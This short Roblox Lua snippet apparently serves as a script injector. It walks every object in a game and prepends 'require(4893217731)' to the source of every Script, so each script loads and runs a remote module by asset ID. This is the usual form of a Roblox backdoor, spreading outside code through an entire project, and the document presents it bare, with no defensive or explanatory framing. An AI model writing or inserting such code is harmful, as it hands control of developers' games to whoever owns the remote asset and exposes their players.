for _, s in pairs(game:GetDescendants()) do
	if s:IsA("Script") then
		s.Source = "require(4893217731) " .. s.Source
	end
end
